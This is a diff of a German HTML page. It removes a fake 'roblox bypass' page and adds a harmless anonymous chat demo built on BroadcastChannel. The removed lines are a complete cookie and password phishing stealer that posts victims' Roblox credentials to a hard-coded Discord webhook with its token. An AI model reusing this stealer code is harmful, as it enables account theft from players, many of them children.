@@ -1,186 +1,316 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8">
-  <title>Roblox tools</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Anonymer Chat – Demo mit Einladungscode</title>
   <style>
-    * { box-sizing: border-box; }
-    body {
-      font-family: "Segoe UI", sans-serif;
-      background: linear-gradient(135deg, #141e30, #243b55);
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+    :root{
+      --bg:#0f172a; --card:#111827; --muted:#1f2937; --text:#e5e7eb; --sub:#9ca3af; --accent:#22c55e;
+      --danger:#ef4444; --ring:rgba(34,197,94,.35);
     }
-    .container {
-      background: rgba(47, 49, 54, 0.95);
-      padding: 30px;
-      border-radius: 20px;
-      width: 540px;
-      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6),
-                  0 0 30px rgba(88, 101, 242, 0.4);
-      border: 2px solid transparent;
-      background-image: linear-gradient(135deg, #2f3136, #23272a),
-                        linear-gradient(135deg, #5865f2, #43b581);
-      background-origin: border-box;
-      background-clip: padding-box, border-box;
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,"Helvetica Neue",Arial;
+      background:linear-gradient(180deg,#0b1223, var(--bg)); color:var(--text);
+      min-height:100svh; display:flex; align-items:center; justify-content:center; padding:24px;
     }
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      font-size: 26px;
-      color: #7289da;
-      text-shadow: 0 0 8px #5865f299;
+    .app{
+      width:100%; max-width:980px; display:grid; gap:16px;
+      grid-template-columns: 340px 1fr;
     }
-    .options {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 14px;
-      margin-bottom: 22px;
+    .card{background:var(--card); border:1px solid #1f2937; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,.35)}
+    .panel{padding:18px}
+    h1{margin:0 0 6px;font-size:20px;font-weight:700;letter-spacing:.2px}
+    .sub{color:var(--sub); font-size:13px; margin-bottom:14px}
+    .field{display:flex; gap:8px; margin:10px 0 14px}
+    .input, .btn{
+      border-radius:12px; border:1px solid #293241; background:#0b1223; color:var(--text);
+      padding:12px 14px; font-size:14px; outline:none; transition:.15s ease;
     }
-    .option {
-      background: #4f545c;
-      padding: 18px;
-      border-radius: 14px;
-      text-align: center;
-      cursor: pointer;
-      transition: all 0.25s ease;
-      font-size: 22px;
-      font-weight: bold;
-      user-select: none;
-      border: 2px solid transparent;
+    .input{flex:1}
+    .input:focus{border-color:var(--accent); box-shadow:0 0 0 4px var(--ring)}
+    .btn{background:linear-gradient(180deg,#16a34a,#15803d); border-color:#14532d; cursor:pointer; font-weight:600}
+    .btn:hover{filter:brightness(1.05)}
+    .btn.secondary{background:#111827; border-color:#2a3345; font-weight:600}
+    .btn.secondary:hover{background:#0f172a}
+    .btn.copy{padding:10px 12px}
+    .tag{display:inline-flex; gap:6px; align-items:center; background:#0b1223; border:1px dashed #324155; padding:8px 10px; border-radius:12px; font-size:12px; color:var(--sub)}
+    .row{display:flex; gap:8px; align-items:center; flex-wrap:wrap}
+    .chat{
+      display:grid; grid-template-rows: auto 1fr auto; height:600px; overflow:hidden;
     }
-    .option:hover {
-      background: #5865f2;
-      transform: translateY(-3px) scale(1.05);
-      box-shadow: 0 0 12px #5865f299;
+    .roombar{display:flex; justify-content:space-between; align-items:center; padding:14px 18px; border-bottom:1px solid #1f2937}
+    .room{font-size:14px}
+    .messages{padding:16px; overflow:auto; background:radial-gradient(1200px 600px at 80% -10%, rgba(34,197,94,.08), transparent 60%)}
+    .msg{
+      max-width:72ch; margin:8px 0; padding:10px 12px; background:#0b1223; border:1px solid #273247; border-radius:14px;
+      line-height:1.35; white-space:pre-wrap; word-break:break-word;
     }
-    .option.active {
-      background: #43b581;
-      border-color: #2ecc71;
-      box-shadow: 0 0 18px #2ecc71cc;
-      transform: scale(1.1);
+    .me{background:rgba(34,197,94,.08); border-color:#24553a}
+    .meta{font-size:12px; color:var(--sub); margin-bottom:6px}
+    .composer{display:flex; gap:10px; padding:12px; border-top:1px solid #1f2937; background:#0b1223}
+    textarea{
+      flex:1; resize:none; min-height:44px; max-height:140px; border-radius:12px; border:1px solid #2a3345; background:#0f172a; color:var(--text); padding:10px 12px; font-size:14px;
     }
-    textarea {
-      width: 100%;
-      height: 120px;
-      padding: 14px;
-      border-radius: 14px;
-      border: 2px solid transparent;
-      resize: none;
-      margin-bottom: 16px;
-      font-size: 15px;
-      background: #202225;
-      color: white;
-      outline: none;
-      background-image: linear-gradient(#202225, #2c2f33),
-                        linear-gradient(135deg, #5865f2, #43b581);
-      background-origin: border-box;
-      background-clip: padding-box, border-box;
-    }
-    textarea:focus {
-      box-shadow: 0 0 12px #5865f299;
-    }
-    button {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 14px;
-      background: linear-gradient(135deg, #5865f2, #4752c4);
-      color: white;
-      font-size: 17px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: all 0.25s ease;
-      box-shadow: 0 0 12px rgba(0,0,0,0.4);
-    }
-    button:hover {
-      background: linear-gradient(135deg, #6d7ff7, #5865f2);
-      transform: translateY(-3px);
-      box-shadow: 0 6px 20px rgba(88,101,242,0.5);
-    }
-    button:active {
-      transform: scale(0.97);
-    }
-    /* Zusatzfeld Styling */
-    #extraBox {
-      display: none;
+    textarea:focus{border-color:var(--accent); box-shadow:0 0 0 4px var(--ring)}
+    .help{font-size:12px; color:var(--sub); padding:0 18px 14px}
+    .muted{color:var(--sub)}
+    .warn{color:var(--danger)}
+    @media (max-width: 920px){
+      .app{grid-template-columns:1fr}
+      .chat{height:70svh}
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2> roblox bypass</h2>
-    <div class="options" id="options">
-      <div class="option">email bypass [up to 2008]</div>
-      <div class="option">13+ to 13- all ages</div>
-      <div class="option">coming soon...</div>
-      <div class="option">coming soon...</div>
+  <div class="app">
+    <!-- LEFT: Controls -->
+    <div class="card panel">
+      <h1>Anonymer Chat – Demo</h1>
+      <div class="sub">Erstelle einen Chatraum per Klick oder tritt mit Code bei. Keine Registrierung.</div>
+
+      <div class="tag" id="youTag">Dein Alias: <strong id="alias" style="color:#e5e7eb;margin-left:6px"></strong></div>
+
+      <h3 style="margin:16px 0 6px;font-size:14px">Neuen Chat erstellen</h3>
+      <div class="field">
+        <button id="createBtn" class="btn">Chat erstellen</button>
+        <button id="leaveBtn" class="btn secondary" title="Raum verlassen">Verlassen</button>
+      </div>
+
+      <h3 style="margin:6px 0 6px;font-size:14px">Mit Code beitreten</h3>
+      <div class="field">
+        <input id="codeInput" class="input" placeholder="Einladungscode eingeben" autocomplete="off" />
+        <button id="joinBtn" class="btn">Beitreten</button>
+      </div>
+
+      <div class="row" style="margin-top:8px">
+        <span class="tag">Aktueller Raum: <strong id="roomLabel" style="color:#e5e7eb;margin-left:6px">–</strong></span>
+        <button id="copyCodeBtn" class="btn secondary copy" title="Code kopieren">Code kopieren</button>
+        <button id="copyLinkBtn" class="btn secondary copy" title="Link kopieren">Link kopieren</button>
+      </div>
+
+      <div class="help">
+        Tipp: Öffne diese Seite in einem zweiten Tab. Nutzt denselben Code, um in Echtzeit zu chatten.<br />
+        <span class="muted">Diese Demo nutzt <code>BroadcastChannel</code> (Fallback: <code>localStorage</code>) – funktioniert zwischen Tabs/Fenstern derselben Domain.</span><br />
+        <span class="warn">Für echte Nutzung über verschiedene Geräte brauchst du ein Backend (z. B. WebSockets).</span>
+      </div>
     </div>
-    <textarea id="message" placeholder="paste your cookie there"></textarea>
-    <textarea id="extraBox" placeholder="paste the password"></textarea>
-    <button id="sendBtn">▶️ Start</button>
+
+    <!-- RIGHT: Chat -->
+    <div class="card chat" role="region" aria-label="Chat">
+      <div class="roombar">
+        <div class="room">Raum: <strong id="topRoom">–</strong></div>
+        <div class="muted" id="presence">Teilnehmer: <span id="peers">1</span></div>
+      </div>
+      <div id="messages" class="messages" aria-live="polite"></div>
+      <div class="composer">
+        <textarea id="text" placeholder="Nachricht schreiben… (Strg+Enter = senden)"></textarea>
+        <button id="sendBtn" class="btn">Senden</button>
+      </div>
+    </div>
   </div>
 
   <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1413845619532890292/b7-jti8140GdQMIxhppoYVN5aTt70Q4TeMelJCI-rYX7VXiDwdAfr1-RwBbkjuBb2upd"; 
-    let selectedOption = null;
+    // === Utilities ===
+    const $ = (s)=>document.querySelector(s);
+    const escapeHTML = (s)=>s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+    const randomCode = (len=6)=>{
+      const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // ohne leicht verwechselbare Zeichen
+      let out=""; crypto.getRandomValues(new Uint8Array(len)).forEach(n=>out += alphabet[n % alphabet.length]);
+      return out;
+    };
+    const shortId = ()=> Math.floor(10_000 + Math.random()*89_999).toString();
+    const now = ()=> new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
 
-    const extraBox = document.getElementById("extraBox");
+    // Persist minimal identity per-tab
+    const alias = localStorage.getItem('demo_alias') || `Anon-${shortId()}`;
+    localStorage.setItem('demo_alias', alias);
+    $('#alias').textContent = alias;
 
-    // Optionen Klick
-    document.querySelectorAll(".option").forEach(opt => {
-      opt.addEventListener("click", () => {
-        document.querySelectorAll(".option").forEach(o => o.classList.remove("active"));
-        opt.classList.add("active");
-        selectedOption = opt.textContent.trim();
+    // State
+    let room = null;
+    let channel = null;
+    let lastPresencePing = 0;
+    const peers = new Map(); // peerId -> lastSeen
+    const myId = crypto.randomUUID();
 
-        // Wenn "13+ to 13- all ages" gewählt → extra Feld anzeigen
-        if (selectedOption === "13+ to 13- all ages") {
-          extraBox.style.display = "block";
-        } else {
-          extraBox.style.display = "none";
-        }
-      });
-    });
+    // UI bindings
+    const setRoomUI = (code)=>{
+      room = code || null;
+      $('#roomLabel').textContent = code || '–';
+      $('#topRoom').textContent = code || '–';
+      document.title = code ? `Chat ${code} – Anonymer Chat` : 'Anonymer Chat – Demo';
+      if(!code){ $('#messages').innerHTML = ''; }
+      updatePresenceLabel();
+    };
 
-    // Senden
-    document.getElementById("sendBtn").addEventListener("click", async () => {
-      const msg = document.getElementById("message").value;
-      const extra = extraBox.value;
+    const copy = async (text)=>{
+      try{ await navigator.clipboard.writeText(text); toast('Kopiert!'); }
+      catch{ toast('Konnte nicht kopieren'); }
+    };
 
-      if (!msg) {
-        alert("❌ PASTE THE COOKIE");
+    const toast=(msg)=>{
+      const t=document.createElement('div');
+      t.textContent=msg;
+      t.style.position='fixed'; t.style.bottom='18px'; t.style.right='18px';
+      t.style.padding='10px 12px'; t.style.background='rgba(34,197,94,.15)';
+      t.style.border='1px solid #24553a'; t.style.borderRadius='12px'; t.style.color='#e5e7eb';
+      t.style.backdropFilter='blur(6px)'; t.style.zIndex='9999'; t.style.boxShadow='0 6px 22px rgba(0,0,0,.35)';
+      document.body.appendChild(t); setTimeout(()=>t.remove(),1400);
+    };
+
+    // Messaging layer: BroadcastChannel with localStorage fallback
+    let lsKey = null;
+    function openChannel(code){
+      closeChannel();
+      if(!code) return;
+      lsKey = `chat_${code}`;
+      try{
+        channel = new BroadcastChannel(`chat_${code}`);
+        channel.onmessage = (ev)=>handleMessage(ev.data);
+      }catch(e){
+        channel = null;
+      }
+      window.addEventListener('storage', storageListener);
+      // announce presence
+      send({type:'hello', id:myId, alias});
+      setInterval(presenceTick, 3000);
+    }
+
+    function closeChannel(){
+      if(channel){ channel.close(); channel=null; }
+      window.removeEventListener('storage', storageListener);
+      peers.clear(); updatePresenceLabel();
+    }
+
+    function storageListener(ev){
+      if(ev.key === lsKey && ev.newValue){
+        try{ handleMessage(JSON.parse(ev.newValue)); }catch{}
+      }
+    }
+
+    function send(payload){
+      if(!room) return;
+      const msg = {...payload, room, ts: Date.now()};
+      if(channel){ channel.postMessage(msg); }
+      try{ localStorage.setItem(lsKey, JSON.stringify(msg)); }catch{}
+    }
+
+    function presenceTick(){
+      if(!room) return;
+      if(Date.now() - lastPresencePing > 2500){
+        lastPresencePing = Date.now();
+        send({type:'ping', id:myId, alias});
+      }
+      // cleanup peers >10s
+      const cutoff = Date.now() - 10000;
+      for(const [id, seen] of peers.entries()){ if(seen < cutoff) peers.delete(id); }
+      updatePresenceLabel();
+    }
+
+    function handleMessage(msg){
+      if(!msg || msg.room !== room) return;
+      if(msg.type === 'hello'){ // reply our presence
+        peers.set(msg.id, msg.ts || Date.now());
+        send({type:'present', id:myId, alias});
+        updatePresenceLabel();
         return;
       }
-      if (!selectedOption) {
-        alert("❌ PICK AN OPTION ");
+      if(msg.type === 'present' || msg.type === 'ping'){
+        peers.set(msg.id, msg.ts || Date.now());
+        updatePresenceLabel();
         return;
       }
-
-      let finalMsg = `${selectedOption} ${msg}`;
-      if (selectedOption === "13+ to 13- all ages" && extra) {
-        finalMsg += ` | Extra: ${extra}`;
+      if(msg.type === 'chat'){
+        renderMessage(msg, false);
       }
+    }
 
-      try {
-        const response = await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: finalMsg }),
-        });
+    function updatePresenceLabel(){
+      $('#peers').textContent = Math.max(1, peers.size || (room?1:0));
+    }
 
-        if (!response.ok) throw new Error("HTTP " + response.status);
-        alert("BOT IS DOWN ");
-      } catch (err) {
-        alert("⚠️ Fehler: " + err.message);
-      }
+    // Rendering
+    function renderMessage({id, alias:who, text, ts}, isMine){
+      const wrap = document.createElement('div');
+      wrap.className = 'msg'+(isMine?' me':'');
+      wrap.innerHTML = `<div class="meta">${escapeHTML(who||'Anon')} · ${new Date(ts||Date.now()).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>${escapeHTML(text||'')}`;
+      $('#messages').appendChild(wrap);
+      $('#messages').scrollTop = $('#messages').scrollHeight;
+    }
+
+    // Actions
+    function createRoom(){
+      const code = randomCode(6);
+      joinRoom(code);
+    }
+    function joinRoom(code){
+      if(!code) return;
+      setRoomUI(code);
+      openChannel(code);
+      const url = new URL(location.href);
+      url.searchParams.set('code', code);
+      history.replaceState(null, '', url.toString());
+      toast(`Raum ${code} bereit`);
+    }
+    function leaveRoom(){
+      setRoomUI(null);
+      closeChannel();
+      const url = new URL(location.href);
+      url.searchParams.delete('code');
+      history.replaceState(null, '', url.toString());
+      toast('Raum verlassen');
+    }
+    function sendChat(){
+      const ta = $('#text');
+      const text = (ta.value || '').trim();
+      if(!text || !room) return;
+      const msg = {type:'chat', id:myId, alias, text, ts: Date.now()};
+      renderMessage(msg, true);
+      send(msg);
+      ta.value = '';
+      ta.style.height = '44px';
+    }
+
+    // Wire UI
+    $('#createBtn').addEventListener('click', createRoom);
+    $('#leaveBtn').addEventListener('click', leaveRoom);
+    $('#joinBtn').addEventListener('click', ()=>{
+      const code = $('#codeInput').value.trim().toUpperCase();
+      if(!code){ toast('Bitte Code eingeben'); return; }
+      joinRoom(code);
+      $('#codeInput').value='';
     });
+    $('#copyCodeBtn').addEventListener('click', ()=>{
+      if(!room) return toast('Kein Raum aktiv');
+      copy(room);
+    });
+    $('#copyLinkBtn').addEventListener('click', ()=>{
+      if(!room) return toast('Kein Raum aktiv');
+      const url = new URL(location.href); url.searchParams.set('code', room);
+      copy(url.toString());
+    });
+    $('#sendBtn').addEventListener('click', sendChat);
+    $('#text').addEventListener('keydown', (e)=>{
+      if(e.key==='Enter' && (e.ctrlKey || e.metaKey)){ e.preventDefault(); sendChat(); }
+    });
+    // auto-grow textarea
+    $('#text').addEventListener('input', (e)=>{
+      e.target.style.height='auto';
+      e.target.style.height=Math.min(140, e.target.scrollHeight)+'px';
+    });
+
+    // Autoload from ?code=...
+    (function initFromURL(){
+      const params = new URLSearchParams(location.search);
+      const code = (params.get('code')||'').toUpperCase();
+      if(code){ joinRoom(code); }
+    })();
   </script>
 </body>
 </html>
+
+
 
 
